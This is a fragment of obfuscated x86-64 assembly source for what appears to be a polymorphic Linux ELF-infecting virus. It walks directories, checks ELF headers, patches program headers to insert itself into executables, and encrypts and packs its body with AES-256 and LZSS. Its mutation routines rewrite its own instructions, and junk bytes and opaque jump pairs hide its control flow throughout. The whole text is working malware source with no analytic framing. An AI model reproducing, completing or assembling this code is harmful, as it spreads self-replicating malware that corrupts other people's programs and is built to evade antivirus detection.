db 0x4b
    jl          ..@PyCazcMNyUBg
    jge         ..@PyCazcMNyUBg
..@ZtNqcFSnLXJx:
    or          cl, al
    jmp         $+3
db 0xf8
    jb          ..@Yn5uvGOhLqi3
    jae         ..@Yn5uvGOhLqi3
..@0mRtLOgc4pDT:
    shl         rbx, 8
    jb          ..@hB8QtuBtfdmy
    jae         ..@hB8QtuBtfdmy
..@4d0yjofYkuGQ:
    pop         r1
    cmp         QWORD m6, 0x00
    mov         rsp, rsp
    je          ..@i8sfLnEsHFqL
    jne         ..@i8sfLnEsHFqL
..@y5ECWSD5gQiO:
    xchg        rax, rax
    jl          ..@y4sXC6r5rvB6
    jge         ..@y4sXC6r5rvB6
..@OMEG9ZN5wbLd:
    mov         rax, 0xff
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jmp         ..@7Zz4SpvqB74J
..@LVwGzfOdMUZ2:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    xor         rax, rax
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    js          ..@nkeTxUtIynWv
    jns         ..@nkeTxUtIynWv
..@o8zTORPEo0E1:
    mov         rdi, rdi
    xchg        rcx, rcx
    jmp         $+3
db 0xab
    js          ..@EiLImiAXyma9
    jns         ..@EiLImiAXyma9
..@XXbV8CVn9b1K:
    push        rbx
    pop         rbx
    jmp         $+4
db 0x92, 0x30
    jb          ..@5SSlfl4DIfiQ
    jae         ..@5SSlfl4DIfiQ
..@c3WTT2CADKeH:
    ret
    jmp         NonBinaryFile
..@4MzMVwacKY8S:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jb          ..@BMKiu3uDB1So
    jae         ..@BMKiu3uDB1So
..@VIudUbte6qRw:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@hn60zTEVj66E
..@z0Nm6ShWInf0:
    jl          ..@kziuSOezBNPL
    jmp         ..@kjKP5jcZyYKP
..@cyIDqltlLHAf:
    mov         bl, BYTE [rsi]
    not         bl
    add         ebx, 1
    jmp         $+4
db 0x54, 0xe0
    js          ..@DaTWSiiEzLMQ
    jns         ..@DaTWSiiEzLMQ
..@dEu68mXB0m3b:
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+5
db 0xbf, 0x9b, 0x42
    jmp         $+4
db 0x60, 0x82
    js          ..@3UKFPVfCJfJA
    jns         ..@3UKFPVfCJfJA
..@Dq2ue5AwuM2T:
    push        r1
    xor         rdi, rdi
    xor         rcx, rcx
    jmp         $+4
db 0x4b, 0x67
    js          ..@ybO2VPsg15lq
    jns         ..@ybO2VPsg15lq
..@uVJCfosuEu8s:
    add         r2, _virus-_start
    jmp         $+4
db 0x78, 0xa3
    jmp         ..@y4FgArOH3lON
..@8XTGYnBT6iil:
    xchg        rsp, rsp
    jmp         ..@PVDLXW8e3buZ
..@MqgqbCvZVyq4:
    mov         rsi, rsi
    mov         rdi, rsi
    mov         rbx, rbx
    js          ..@VlV1bMCtPtvT
    jns         ..@VlV1bMCtPtvT
..@Mjgcg0mvjm6d:
    mov         rdx, rdx
    xor         rax, rax
    xor         rdx, rdx
    je          ..@VvJk88zCBRfo
    jne         ..@VvJk88zCBRfo
..@sYh885LApgDD:
    and         r2, 0xfffffffffffffff0
    jmp         ..@Tpf2Nhmyw39G
..@xZb7GVhVMq54:
    mov         DWORD [rsp+_KEYGEN_OFF.fd], eax
    js          ..@PXfKk7reBo37
    jns         ..@PXfKk7reBo37
..@PDRtXRHMklhX:
%ifdef X86_32
    mov         edi, 0xffffffff
    push        ebp
%endif
    jmp         $+4
db 0x37, 0xad
    jl          ..@jGU44wOkZ9gc
    jge         ..@jGU44wOkZ9gc
..@PA9RtOahiuFj:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    jmp         $+3
db 0xb3
    jmp         ..@VWCOp9xDH6cA
..@pUPLVq3153jW:
    test        rax, rax
    jmp         $+5
db 0x5f, 0x84, 0x1b
    jmp         $+5
db 0xc1, 0xbd, 0x37
    jb          ..@9WMYvxrqUnZ0
    jae         ..@9WMYvxrqUnZ0
..@zB57IGGXrttJ:
    call_vsp    Strlen
    jb          ..@3GmWyn4E4deB
    jae         ..@3GmWyn4E4deB
..@umZVg8BlZVfr:
    cmp         BYTE [r1], 0x00
    jmp         ..@YVAqx36GEcLK
..@gadVvkum1seV:
    jmp         ..@JhkRtZSpGDmp
    jmp         ..@u1Aq4nMY4TnA
..@jSni2SEiqozn:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+4
db 0xda, 0xe1
    jmp         $+3
db 0x0b
    jmp         $+5
db 0x1b, 0x37, 0x1f
    jb          ..@qghZT6PDYCta
    jae         ..@qghZT6PDYCta
..@xMH8yRVH8aUY:
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    push        rsi
    jl          ..@lgibe0fsYdJj
    jge         ..@lgibe0fsYdJj
..@YwQHSpD8fYRJ:
    mov         rdi, rdi
    jmp         $+3
db 0xcb
    je          ..@ji0l0YdqIzFH
    jne         ..@ji0l0YdqIzFH
..@uw4RRgpJKxCR:
    mov         rdi, m6
    mov         rcx, m7
    jmp         ..@sOei3ACqWSIx
..@eF0jqcs6MfUm:
    jz          ..@lOQEU3M5o9WQ
    jmp         $+5
db 0x7b, 0x5c, 0x9f
    jmp         ..@L8BFsiOqV6d7
..@vBwJFEgFfYX0:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
    xor         r4, r4
%endif
    jmp         $+4
db 0x98, 0xf7
    jmp         ..@5AWDfgnHZeUL
..@FRhkY4qFuJzb:
    pop         rax
    jmp         ..@PA9RtOahiuFj
..@UTojhz6eOy7Z:
    rep         movsb
    xor         rax, rax
    xchg        rcx, rcx
    jmp         $+5
db 0x00, 0x6c, 0x86
    jb          ..@yvQzspz6zfxY
    jae         ..@yvQzspz6zfxY
..@Au0tXk7m4k0Y:
%ifdef X86_64
    sete        cl
    je          ..@HGikMboLI6OP
%endif
    jmp         $+5
db 0x35, 0xf1, 0x2d
    jmp         $+4
db 0xe7, 0x79
    jmp         $+3
db 0x9c
    jmp         $+3
db 0x99
    jb          ..@cHmWeqpF8Tyv
    jae         ..@cHmWeqpF8Tyv
..@winwgenmNWV5:
    xor         rax, rax
    xor         rbx, rbx
    push        rax
    jmp         $+5
db 0x5d, 0x9e, 0x29
    jmp         $+3
db 0xeb
    jl          ..@BZOMTd2RPvLf
    jge         ..@BZOMTd2RPvLf
KeyGen:
    jmp         ..@5luxX1sx4Hwk
..@xUsCIMreGjaT:
    xor         rdi, rdi
    jmp         $+5
db 0x5b, 0xa5, 0xdd
    jmp         ..@C4pAEdB2vCXd
..@76hkp3XCJU7B:
    mov         ecx, 0c0h
    jmp         $+3
db 0x2c
    js          ..@t2tRr5Wqswcf
    jns         ..@t2tRr5Wqswcf
..@ruePeArAwH0N:
    test        rax, rax
    jl          ..@dVE23ZuLAw71
    jge         ..@dVE23ZuLAw71
..@jdAF23efy53g:
    xor         rcx, rcx
    mov         rdi, m7
    mov         rbp, rbp
    js          ..@TTnS8OKIHAVi
    jns         ..@TTnS8OKIHAVi
..@oE3DDq7lXtjS:
    cmp         BYTE [r1+16], ET_DYN
    mov         rax, rax
    jmp         ..@w7DgBXrNED35
..@VFwnRCxFVP9m:
    cmp         cl, 0x4
    je          ..@z0Nm6ShWInf0
    jne         ..@z0Nm6ShWInf0
..@z5uoxc4vwrm2:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    jb          ..@BXgS3dX0jPme
    jae         ..@BXgS3dX0jPme
..@Qm2RprrCeauZ:
    mov         rsi, rsi
    xor         rax, rax
    mov         rdi, rdi
    jmp         $+5
db 0x80, 0x24, 0x20
    js          ..@HyxhWxWYqVXw
    jns         ..@HyxhWxWYqVXw
..@odPdHcolPTlk:
    call        Aes256Encryption
    jmp         ..@AYi5ZrLiyLcF
..@abAUiN9nx6rN:
    pop         rdi
    jmp         $+5
db 0x60, 0xe6, 0x1e
    jmp         $+3
db 0x94
    je          ..@wkB5sDOWdk5f
    jne         ..@wkB5sDOWdk5f
..@PyCazcMNyUBg:
    jne         ..@mSgZBkWqVcoU
    jmp         $+5
db 0xf3, 0xd7, 0xe1
    jl          ..@iWSFsWG9BsjN
    jge         ..@iWSFsWG9BsjN
..@nkItDkGMFTGy:
    mov         rdx, rsi
    js          ..@gyzCrlNp3qzP
    jns         ..@gyzCrlNp3qzP
..@gfPM53L5bEUI:
    xor         rax, rax
    push        rcx
    je          ..@GZaXgyoGcP6X
    jne         ..@GZaXgyoGcP6X
..@i8sfLnEsHFqL:
    je          ..@VIudUbte6qRw
    cmp         QWORD m7, 0x00
    je          ..@VIudUbte6qRw
    jmp         ..@AcOOQDtSquQY
..@H1BdCHpeEnXW:
    xchg        rdx, rdx
    xchg        rcx, rcx
    jmp         $+5
db 0x1a, 0x24, 0x8f
    jmp         $+3
db 0x79
    jl          CreatePayload
    jge         CreatePayload
IsNum:
    jmp         ..@3bM17ePst04Y
..@pCygiE6Fim1Q:
    jne         ..@UmkWJKXCY9no
    jmp         $+3
db 0x5b
    jb          ..@76UtvF8CkhTo
    jae         ..@76UtvF8CkhTo
..@k4DWPbKAffEW:
    push        rdx
    pop         rdx
    xor         rax, rax
    jmp         ..@gF5PZ4AdfUcn
..@wjnxZPSRQcFT:
    rep movsb 
    jmp         $+4
db 0x45, 0x85
    jmp         $+4
db 0x67, 0x37
    je          ..@Qb1U3mduio6O
    jne         ..@Qb1U3mduio6O
..@D1ORj64AVvoe:
    mov         [r1], rax
    jmp         ..@WX0MzFP9JUQo
..@ti8xBiKnC8wo:
    add         ecx, 1
    jb          ..@gw9R7uk1aryj
    jae         ..@gw9R7uk1aryj
..@C4pAEdB2vCXd:
    xor         rdx, rdx
    jb          ..@xgKYMsnINfUd
    jae         ..@xgKYMsnINfUd
..@Ys8L1a2MFhLU:
    mov         rax, (-1)
    jmp         $+5
db 0x07, 0x39, 0xc7
    jmp         $+4
db 0x8e, 0x9c
    jb          ..@dzZyYPM4IUOJ
    jae         ..@dzZyYPM4IUOJ
..@j0bkbqsEvUun:
    push        rax
    js          ..@P7kDwU2zbZ1Y
    jns         ..@P7kDwU2zbZ1Y
..@EMYmI8xWY5Jj:
    test        al, al
    jz          ..@9hmYbkxp4VZM
    call        ConvertDoubleJumpToJump
    jmp         ..@NotAFNw9t4kW
..@7u9bB4DxHK16:
    xor         rdx, rdx
    rep         nop
    jmp         $+3
db 0x6f
    je          ..@PVdtkdVMjzTV
    jne         ..@PVdtkdVMjzTV
..@AX1dUrixaByA:
    mov         rsi, rsi
    pop         rcx
    add         rdi, rcx
    jmp         $+5
db 0xf6, 0xdb, 0x8f
    jmp         ..@X93v2wMBT5xu
..@FnMXvPx6VDDd:
%ifdef X86_64
    and         edx, 0f8fff8ffh
%endif
    jmp         $+3
db 0x9c
    jmp         ..@BF0S18XyC9iZ
..@PxiiEGXpbOMb:
    add         rsp, _DYNPIE_OFF_size
    pop         r2
    jmp         ..@optQ5hxUcfCq
..@SLzDbYpGtJm7:
    xor         rdx, rdx
    je          ..@mS4iGbhivhvW
    jne         ..@mS4iGbhivhvW
..@vHeyPyZtrjTt:
%ifdef X86_64
    and         dx, 0700h
%endif
    jl          ..@W1LuuxNnE1kc
    jge         ..@W1LuuxNnE1kc
..@dwLr409jYmZ1:
    jmp         ..@ydxgYMNAIgM8
    je          ..@VORRuz4SL90B
    jne         ..@VORRuz4SL90B
..@ePsHuV22Ud2S:
    jz          ..@Yw6dRmjDEml2
    cmp         BYTE [r1], 0x30
    push        rsi
    je          ..@IbBzKP5fvId8
    jne         ..@IbBzKP5fvId8
..@rgKmqdLpDs3V:
    mov         edx, DWORD [rdi]
    jmp         ..@B2nxPRqBkWLd
..@EdHxijHvPUyX:
    test        eax, eax
    push        rax
    pop         rax
    jmp         ..@Vt6fcraHmQE8
..@xLJHX94GYA0v:
    xchg        rsi, rsi
    jmp         $+3
db 0x4d
    jmp         $+4
db 0xf0, 0xfb
    jmp         $+4
db 0xe2, 0x10
    jmp         ..@nKceLtus0mx8
..@AZ50Aj3swbKz:
    call        AddSizeMappedFile
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    jmp         ..@HuWVhYYpnJbu
..@dvLhxmtLjpWS:
    pop         rcx
    jmp         $+4
db 0x04, 0x55
    js          ..@xffAMAhx40ez
    jns         ..@xffAMAhx40ez
..@df3ybEaxWVTu:
    push        rdx
    pop         rdx
    jmp         ..@PuO28pFapOXJ
    jmp         $+3
db 0x07
    jmp         $+5
db 0x8d, 0x20, 0x4b
    jmp         $+5
db 0xaf, 0x7a, 0x3a
    jmp         ..@QHdP0daYLnb0
..@QOFtfvHFf8Jv:
    push        rdx
    js          ..@U3RpwZN8WUUF
    jns         ..@U3RpwZN8WUUF
..@sTncRpwqK9Aq:
    xchg        rsp, rsp
    call        Strcpy
    jmp         $+4
db 0x27, 0x64
    jb          ..@gIUhrMFEQHgD
    jae         ..@gIUhrMFEQHgD
..@c6YeBjGMq3tU:
    xor         rdi, rdi
    jb          ..@RVStMf3rnEzm
    jae         ..@RVStMf3rnEzm
..@2NpIvKnOc7Pl:
    call        ConvertJumpToDoubleJump
    push        rbx
    jmp         $+3
db 0x98
    jb          ..@gdAfti8zn1fW
    jae         ..@gdAfti8zn1fW
..@mAMUeLcSRZtq:
    push        r3
    mov         r1, r4
    mov         rdi, rdi
    jmp         $+3
db 0x2f
    jmp         ..@zJ2nJGnVw8nj
..@mR23lF7xERUm:
    jmp         ..@oCGmYSVwYlWR
    jmp         ..@7E4bycw6Qoqi
ConvertDoubleJumpToJump:
    jmp         ..@iPmV9M7rXfwC
..@pxPyVvlMQW1U:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3
    add         rax, p_h.p_type
    jmp         $+3
db 0x63
    jmp         ..@KudWXLVhmzU1
..@g09Y2ImfeQvY:
    mov         ecx, signature_len
    jmp         $+3
db 0xf0
    jmp         $+3
db 0xc2
    jmp         $+5
db 0xbe, 0x92, 0x6b
    js          ..@zRsTC2qr0xP2
    jns         ..@zRsTC2qr0xP2
..@CjOFnyczNUbZ:
    push        rbx
    jmp         $+3
db 0xc3
    jmp         $+4
db 0x56, 0x5a
    je          ..@KpIaA8NLpmac
    jne         ..@KpIaA8NLpmac
..@amdq3pPU6wtm:
    shr         edx, 1
    test        edx, edx
    jmp         $+3
db 0x36
    js          ..@4iHGd5DDpo4q
    jns         ..@4iHGd5DDpo4q
..@dWjI1GoznNOz:
    jmp         ..@gF5PZ4AdfUcn
    jmp         ..@xGQ7GtefNnxB
..@YHFedMb7XjQP:
%ifdef X86_32
    mov         ecx, r3
%endif
    jl          ..@wY1ZVyqBpime
    jge         ..@wY1ZVyqBpime
..@CpwjX2q4tcA0:
    mov         DWORD [r5+file.filefd], eax
    jmp         $+4
db 0xde, 0x86
    jmp         $+3
db 0xb2
    je          ..@ky1a77jSuhe6
    jne         ..@ky1a77jSuhe6
..@PwV5SU96lvY9:
    jne         ..@mSgZBkWqVcoU
    mov         r2, m5
    jmp         $+4
db 0x85, 0xf1
    jb          ..@mjsRh0FCHHhf
    jae         ..@mjsRh0FCHHhf
..@5PHOpa1zCQ8D:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    sub         al, 0x02
    jl          ..@EBiHMJGzySCF
    jge         ..@EBiHMJGzySCF
..@w6zOxe36sGbT:
    OFILE       [r5], 0x00
    cmp         eax, 0x3
    jl          ..@7hDNqIZAb58j
    jmp         ..@xZb7GVhVMq54
..@1Ol4pjDNAHDV:
    push        rdx
    jmp         ..@mR9k2roxlrQb
..@q28STlEWGeQc:
    add         rcx, 4
    jmp         $+5
db 0x1d, 0xc9, 0xb5
    jmp         $+3
db 0x05
    jmp         $+5
db 0x16, 0x26, 0x6e
    je          ..@ZKi2F9WQ84Oy
    jne         ..@ZKi2F9WQ84Oy
..@TTnS8OKIHAVi:
    mov         ecx, PADDING
    mov         eax, 0x00
    jmp         $+4
db 0xbe, 0x1b
    jmp         $+4
db 0x2d, 0xd6
    jmp         $+3
db 0xde
    jb          ..@GS1Ef4yNi6ck
    jae         ..@GS1Ef4yNi6ck
..@SyHbJae1fL37:
    xchg        rdi, rdi
    jmp         $+5
db 0xab, 0x0f, 0xc1
    jmp         $+3
db 0xb6
    jmp         ..@S2inBMuMu9h1
..@71DQgWYiFugP:
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    jl          ..@Xk9NhzIPMP7R
    jge         ..@Xk9NhzIPMP7R
DestroyPayload:
    jmp         ..@tgAt9uDDsfXT
..@74iGnCPo0RA5:
    mov         r2, r5
    mov         rbp, rbp
    call        Strcpy
    jmp         $+3
db 0x9e
    jl          ..@ESQC3RhIMwKk
    jge         ..@ESQC3RhIMwKk
..@i44QyKogSeJm:
    mov         QWORD [r2+p_h.p_vaddr], r3
    mov         rsi, rsi
    jmp         $+3
db 0xb0
    jmp         $+5
db 0xd3, 0x93, 0x25
    jmp         $+4
db 0x79, 0x87
    jl          ..@PXehnS2x4PKS
    jge         ..@PXehnS2x4PKS
..@e7HUtGFqQ1pw:
    cmp         BYTE [r1+4], ELFCLASS
    jmp         $+4
db 0x9c, 0x31
    jb          ..@ahmyw3Qlj5KB
    jae         ..@ahmyw3Qlj5KB
..@8xI6m8fWwWl8:
    jle         ..@oXHvF2Fg7pSY
    jb          ..@gj7vik8ObgTa
    jae         ..@gj7vik8ObgTa
..@ukdT8x5La4Q0:
    mov         rbx, rbx
    pop         r4
    jmp         $+3
db 0x50
    jmp         $+4
db 0x07, 0x6d
    jmp         $+3
db 0x54
    je          ..@846cx2tjsm7x
    jne         ..@846cx2tjsm7x
..@75ohYMSoAkrM:
    mov         BYTE [rdi], bl
    jmp         $+3
db 0x34
    jmp         $+5
db 0x0b, 0x0d, 0x7a
    jl          ..@2Ry8oyOv3CcZ
    jge         ..@2Ry8oyOv3CcZ
ConvertPushPopValueToMoveValue:
    jmp         ..@tOXjZ13y7MFQ
..@lD9lfum5EyOL:
    mov         ebx, esi
    mov         rcx, rcx
    jl          ..@f4cu2fo7TTIt
    jge         ..@f4cu2fo7TTIt
..@nj7IkjrvJKSG:
    mov         rsp, rsp
    mov         rsi, rdi
    add         rsi, WINDOW_LENGTH
    jb          ..@OOOm4IGcnXKs
    jae         ..@OOOm4IGcnXKs
..@pq26tOUByPH6:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+3
db 0xa4
    jmp         $+3
db 0x47
    jmp         $+3
db 0x47
    jmp         $+5
db 0x03, 0x1c, 0x60
    js          ..@dEu68mXB0m3b
    jns         ..@dEu68mXB0m3b
..@eH47zTGMIIpe:
%ifdef X86_32
    mov         WORD [esi+ecx], bx
%endif
    jmp         $+5
db 0xff, 0xd6, 0x68
    js          ..@fAYiGdPYiQgz
    jns         ..@fAYiGdPYiQgz
..@9laUbrlgZINj:
    mov         r5, r2
    jmp         $+5
db 0xdb, 0xd4, 0x9c
    jb          ..@wlN4IDhquRgr
    jae         ..@wlN4IDhquRgr
..@RW5cdZeRv0Pl:
    push        rsi
    pop         rsi
    xor         rcx, rcx
    jl          ..@Al8jT2b21npX
    jge         ..@Al8jT2b21npX
..@dLgHwDY6ADrn:
    mov         ecx, signature_reg_len
    jmp         $+5
db 0x92, 0xc9, 0xe0
    jmp         ..@Roi79lGWWlBM
..@3l0f87AxiFKJ:
    ret
    js          ..@XXbV8CVn9b1K
    jns         ..@XXbV8CVn9b1K
..@PoLUjUoxS4uG:
    movr        r1, rsp
    jmp         $+4
db 0x4a, 0x0b
    jmp         $+3
db 0xbc
    jl          ..@wnddSFQ5nGH2
    jge         ..@wnddSFQ5nGH2
..@pqS8zI91DiSi:
    xor         rcx, rcx
    jl          ..@tZre7MAuDc3A
    jge         ..@tZre7MAuDc3A
..@61SCDE2XIodj:
    aesenc      xmm0, xmm1
    jl          ..@s896LYvCT0Qq
    jge         ..@s896LYvCT0Qq
..@BFDVbjy89gvc:
    xor         r3, r3
    jmp         $+3
db 0xb5
    js          ..@Ht8cjbRbuDUX
    jns         ..@Ht8cjbRbuDUX
..@eGlUQtDjfx7o:
    mov         r2, 11b
    jl          ..@XJ4VQcSxTESH
    jge         ..@XJ4VQcSxTESH
..@2m8OSTxzcjDK:
    mov         rax, SYS_MUNMAP
    jmp         $+5
db 0xb6, 0xd3, 0x9d
    jmp         ..@OK0Tga2slMzX
..@BCXpeJBHiSBd:
    xor         rcx, rcx
    js          ..@l5LU2hTal81V
    jns         ..@l5LU2hTal81V
..@Pm3OZ0CgsMG3:
    mov         edx, DWORD [rdi]
    js          ..@OT0gl0k8VM1D
    jns         ..@OT0gl0k8VM1D
..@3leEV3wtDFcw:
    pop         rcx
    jmp         $+4
db 0xe3, 0x36
    jmp         $+4
db 0x99, 0x4f
    jmp         ..@C1IPVEuZyXlT
..@WutBrwoVWeEb:
    and         dx, 0f0ffh
    jmp         $+3
db 0xf7
    jmp         $+5
db 0x6a, 0xc1, 0x67
    js          ..@tWZN9wJfoBoe
    jns         ..@tWZN9wJfoBoe
..@KneM0DHtjjL7:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    jl          ..@e8SSAXYVC3TA
    jge         ..@e8SSAXYVC3TA
..@XmT8GtMdfRr8:
    ret
    jmp         $+5
db 0xd1, 0x72, 0xfe
    jl          ..@oRqBQCUG7ZZe
    jge         ..@oRqBQCUG7ZZe
..@pm2ZQT8usUTP:
%ifndef ENABLE_DEBUGGING
    mov         rsi, rsi
%endif
    jmp         ..@D3I7OPUup20e
..@Fo0VENIgLkDY:
    and         eax, 0xff
    jmp         $+3
db 0xc5
    jmp         ..@5R9hBjrOWrsi
..@bzC7T4xS0SQS:
    mov         rsi, QWORD [rsp+_MUTA_OFF.start]
    jb          ..@QR4nSlQ4kaBE
    jae         ..@QR4nSlQ4kaBE
..@7JDPnzG199QM:
%ifdef X86_64
    mov         bl, sil
    and         bl, 00000101b
    test        bl, bl
%endif
    jmp         $+4
db 0x8f, 0x1c
    jb          ..@00kZ0bG3KtL0
    jae         ..@00kZ0bG3KtL0
..@8ryqB5a1QuFK:
%ifdef X86_32
    shl         cx, 8
%endif
    jb          ..@cT4CStAVo5Po
    jae         ..@cT4CStAVo5Po
..@Zq008eB6VulF:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jb          ..@glpuW3c7C70S
    jae         ..@glpuW3c7C70S
..@8t1KwSV0wjnZ:
    xor         r2, r2
    js          ..@1LV4Wl9rI4uY
    jns         ..@1LV4Wl9rI4uY
..@NbdbrIrlTPYG:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    rep         nop
    jmp         $+4
db 0x19, 0xe7
    js          ..@yvVheYobv9fz
    jns         ..@yvVheYobv9fz
..@aQhQzAQbggWo:
%ifndef ENABLE_DEBUGGING
    test        eax, eax
    push        rcx
%endif
    jl          ..@VFuiZzD8MJQ3
    jge         ..@VFuiZzD8MJQ3
..@nreh9Ay9foxT:
    mov         rdi, rdi
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    je          ..@oIp7BqqVJ7ZB
    jne         ..@oIp7BqqVJ7ZB
..@Yn5uvGOhLqi3:
%ifdef X86_64
    mov         ebx, 90008900h
%endif
    jmp         $+5
db 0x11, 0x4d, 0xe1
    jmp         $+4
db 0x51, 0xec
    js          ..@otm9O54xr9pk
    jns         ..@otm9O54xr9pk
..@RZxOUEC6HSLH:
    add         ecx, 1
    jl          ..@yVn7Bbba8Wzc
    jge         ..@yVn7Bbba8Wzc
..@YVAqx36GEcLK:
    je          ..@Eanh4onfRkFS
    jmp         $+5
db 0x69, 0x96, 0xd7
    jb          ..@NOQdt8IlsrEZ
    jae         ..@NOQdt8IlsrEZ
..@AyfldDzxiL59:
    xor         rcx, rcx
    mov         rax, QWORD [rsp+_UPDATASIG_OFF.meta_ptr]
    test        rax, rax
    jmp         $+4
db 0x49, 0xc5
    js          ..@OlWfsvpou39D
    jns         ..@OlWfsvpou39D
..@qATh6llNfq3o:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    js          ..@fP1B0SKg4e9U
    jns         ..@fP1B0SKg4e9U
IsELFComplete:
    jmp         ..@8oeRVZYG20Za
..@1LV4Wl9rI4uY:
    mov         r2w, WORD [r1+e_h.e_phnum]
    je          ..@J4Qden9me85a
    jne         ..@J4Qden9me85a
..@z6G85PkJB3dZ:
%ifdef X86_64
    xor         rax, rax
%endif
    jl          ..@7eafCbzbwBTb
    jge         ..@7eafCbzbwBTb
..@jAAW6sOMU7Ms:
    xor         rax, rax
    jmp         ..@c3WTT2CADKeH
..@3LuF2MBRBUts:
    xor         r4, r4
    je          ..@xhnPlifgVHJv
    jne         ..@xhnPlifgVHJv
..@hGmytNHSKIZO:
%ifdef X86_64
    xor         rdi, rdi
    xor         rdx, rdx
%endif
    jmp         $+5
db 0x0c, 0xa9, 0x5e
    jmp         $+4
db 0x99, 0xb3
    jb          ..@0HfEvhxqpcDP
    jae         ..@0HfEvhxqpcDP
..@WdMl6chmbfwQ:
    push        rdi
    push        rax
    jmp         $+5
db 0x35, 0xe7, 0x7a
    js          ..@QKDUADrOjK9R
    jns         ..@QKDUADrOjK9R
..@cT4CStAVo5Po:
    or          ebx, ecx
    jmp         $+4
db 0xce, 0x45
    jl          ..@p1Cm2Jk9BgxK
    jge         ..@p1Cm2Jk9BgxK
..@s1SiTv7hwNmI:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
    xor         r3, r3
    mov         eax, SYS_ACCEPT4
%endif
    jb          ..@nGCaICFiBqsg
    jae         ..@nGCaICFiBqsg
..@vtOpSipkaLDH:
    mov         r3, QWORD [r5+file.filesize]
    jmp         $+4
db 0xae, 0xe6
    jmp         $+4
db 0xfd, 0xc5
    jl          ..@rl5d2gXKtd2Z
    jge         ..@rl5d2gXKtd2Z
..@0Bj2QkI1eomT:
    push        rax
    pop         rax
    and         r3, 0xfff 
    js          ..@N1GjP9DEIY3t
    jns         ..@N1GjP9DEIY3t
..@LOxBkrWbho3F:
    pop         r1
    ret
    js          WORDToDWORDASCII
    jns         WORDToDWORDASCII
..@p7uVbCcKlzEx:
    xor         rdi, rdi
    jl          ..@lNu7oWQuelNn
    jge         ..@lNu7oWQuelNn
..@D8kyaPS5AtuE:
    add         r1, rax
    sub         r1, 1
    cmp         BYTE [r1], DT_DIR
    jmp         $+3
db 0x6f
    jmp         $+4
db 0x6c, 0xb2
    jmp         ..@gtNkd0fKC3pr
..@NiQU6em0nHYb:
%ifdef X86_64
    jne         ..@FHu5TkFyCC6y
%endif
    jmp         ..@hLWYGuQDRZs2
..@9NXcGlv8hxX7:
    rep         stosb
    xor         rax, rax
    xor         r2, r2
    je          ..@bMQwHaN7y0q2
    jne         ..@bMQwHaN7y0q2
..@9Yore8J3Ar1V:
    add         ecx, 1
    mov         rdi, rdi
    rep         cmpsb
    jl          ..@0NT0AImZ5Fds
    jge         ..@0NT0AImZ5Fds
..@wMYZDEPLGcFe:
%ifdef X86_64
    cmp         edx, 00c08048h
    je          ..@TlOOr11ZBt9S
%endif
    jmp         ..@oO9fjNQFUV2V
..@sEmL7O5vXfog:
    mov         r2, original_virus_len-non_packed_len
    call        LzssEncoder
    mov         rdi, m6
    jmp         ..@ziyz88UsLtVP
..@MYlEFZ8FHgG3:
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jmp         $+5
db 0xe7, 0x95, 0x4c
    jl          ..@Y6XplWauVBJc
    jge         ..@Y6XplWauVBJc
..@D9tPFqcOZ2tj:
    jne         ..@dvLhxmtLjpWS
    xor         rdx, rdx
    or          ebx, 0b8h
    jl          ..@4jdKikcJCal9
    jge         ..@4jdKikcJCal9
..@oVuXLm21NVmd:
%ifdef X86_64
    mov         rcx, rcx
%endif
    jb          ..@QfjFbmBINyM6
    jae         ..@QfjFbmBINyM6
..@94k84JH40hHs:
    add         rbx, rdx
    xor         rdx, rdx
    mov         dl, BYTE [rbx]
    jmp         $+5
db 0x11, 0xfa, 0xb2
    jl          ..@79gxHaKYWUup
    jge         ..@79gxHaKYWUup
..@N1GjP9DEIY3t:
    mov         rbx, 0x1000
    jmp         $+5
db 0x7c, 0x43, 0xef
    je          ..@xRxflcPlo8mC
    jne         ..@xRxflcPlo8mC
..@0YCvYJd5Ehif:
    ret
    jmp         Strcpy
..@OOOm4IGcnXKs:
    rep         movsb
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    jmp         $+5
db 0x93, 0x8c, 0x7d
    jl          ..@iEy609KorP4Z
    jge         ..@iEy609KorP4Z
..@ahmyw3Qlj5KB:
    jne         ..@b4Q6YQEBTlxQ
    cmp         BYTE [r1+16], ET_EXEC
    jmp         ..@ChOitFJWMYyD
..@ymO8CUJOf2fz:
    mov         edx, 1
    jmp         ..@JtzHLBXQX9bq
..@gdAfti8zn1fW:
    pop         rbx
    jmp         $+3
db 0x62
    jmp         $+4
db 0x6c, 0x23
    jmp         $+4
db 0xa7, 0xb3
    jmp         ..@QnAcoLRrgE9Z
..@6kybD5EXa8so:
    mov         r1, m6
    add         r1, non_encrypted_len
    mov         r2, m7
    js          ..@PbDqRhyXGcQF
    jns         ..@PbDqRhyXGcQF
..@wqDdvyhDcTQG:
    pop         rcx
    pop         rsi
    xor         rax, rax
